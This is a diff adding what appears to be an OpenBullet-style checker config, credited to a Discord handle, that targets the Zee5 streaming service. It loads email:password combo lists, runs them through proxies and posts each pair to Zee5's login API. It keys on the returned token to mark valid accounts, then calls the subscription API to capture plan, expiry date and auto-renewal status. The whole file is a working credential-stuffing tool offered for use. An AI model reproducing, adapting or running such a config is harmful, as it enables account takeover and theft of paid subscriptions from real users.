@@ -1,0 +1,122 @@
+[SETTINGS]
+{
+  "Name": "Zee5 iOS API",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-08T01:58:51.0571713+04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Zee5 iOS API",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://userapi.zee5.com/v2/user/loginemail" 
+  CONTENT "{\"password\":\"<PASS>\",\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: userapi.zee5.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: ZEE5/2173 CFNetwork/1220.1 Darwin/20.3.0" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "The email address and password combination was wrong during login." 
+    KEY "code\":2122" 
+    KEY "code\":3" 
+    KEY "code\":2121" 
+    KEY "code\":2120" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+REQUEST GET "https://subscriptionapi.zee5.com/v1/subscription?translation=en&country=IN&include_all=true" 
+  
+  HEADER "Host: subscriptionapi.zee5.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: ZEE5/2173 CFNetwork/1220.1 Darwin/20.3.0" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+PARSE "<SOURCE>" LR "\"original_title\":\"" "\"," CreateEmpty=FALSE -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "\"subscription_end\":\"" "T" CreateEmpty=FALSE -> VAR "ex" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<ex>" -> VAR "ut" 
+
+FUNCTION UnixTimeToDate "dd-MM-yyyy" "<ut>" -> CAP "Expiry Date" 
+
+FUNCTION CurrentUnixTime -> VAR "ct" 
+
+PARSE "<SOURCE>" LR "\"recurring_enabled\":" "," CreateEmpty=FALSE -> CAP "Auto Renewal" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "state\":\"activated" 
+    KEY "<ut>" GreaterThan "<ct>" 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<SOURCE>" EqualTo "[]" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "state\":\"failed\"" 
+    KEY "<ct>" GreaterThan "<ut>" 
+  KEYCHAIN Custom "PENDING" OR 
+    KEY "<Expiry Date>" DoesNotExist 
+
